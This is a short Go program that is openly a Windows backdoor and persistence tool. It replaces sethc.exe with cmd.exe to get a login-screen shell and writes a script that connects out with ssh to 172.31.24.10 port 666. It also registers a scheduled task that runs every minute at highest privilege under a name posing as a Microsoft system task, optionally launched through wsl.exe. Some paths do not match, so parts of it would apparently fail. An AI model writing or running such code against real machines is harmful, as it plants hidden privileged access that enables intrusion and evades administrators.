package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
)

//two kinds of options, can do this in a batch, or can do this in a full run.

func batchRun() {

	//backdoor sethc
	batString3 := "copy c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe"
	f3, _ := os.Create("c:\\ProgramData\\chtes.bat")
	defer f3.Close()
	f3.WriteString(batString3)
	exec.Command("c:\\ProgramData\\chtes.bat").Run()

	batString5 := "ssh 172.31.24.10:666"
	f5, _ := os.Create("c:\\Windows\\System32\\pepper.cmd")
	defer f5.Close()
	f5.WriteString(batString5)
	exec.Command("c:\\Windows\\System32\\pepper.bat").Run()
}

func directRun(t string) {

	switch t {
	case "1":
		cmd := exec.Command("SCHTASKS", "/CREATE", "/SC", "MINUTE", "/TN", "MICROSOFT\\Windows\\WCM\\Nettask", "/TR", "c:\\Windows\\Fonts\\pepper.cmd", "/RL", "HIGHEST")
		// Launch the result of the case argument
		cmd.SysProcAttr = &syscall.SysProcAttr{

			CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		}
		if err := cmd.Start(); err != nil {
			log.Printf("Failed proc launch cmd2.")
			return
		}
	case "2":
		cmd := exec.Command("wsl.exe", "--system", "SCHTASKS", "/CREATE", "/SC", "MINUTE", "/TN", "MICROSOFT\\Windows\\WCM\\Nettask", "/TR", "c:\\Windows\\Fonts\\pepper.cmd", "/RL", "HIGHEST")
		// Launch the result of the case argument
		cmd.SysProcAttr = &syscall.SysProcAttr{

			CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		}
		if err := cmd.Start(); err != nil {
			log.Printf("Failed proc launch cmd2.")
			return
		}
	}

}

func main() {
	mode := os.Args[1]
	t := os.Args[2]
	fmt.Println("BeepBoop Meow Meow")
	fmt.Println("Starting the application...")
	switch mode {
	case "file_batch":
		batchRun()
	case "direct_cmd":

		directRun(t)

	}

}
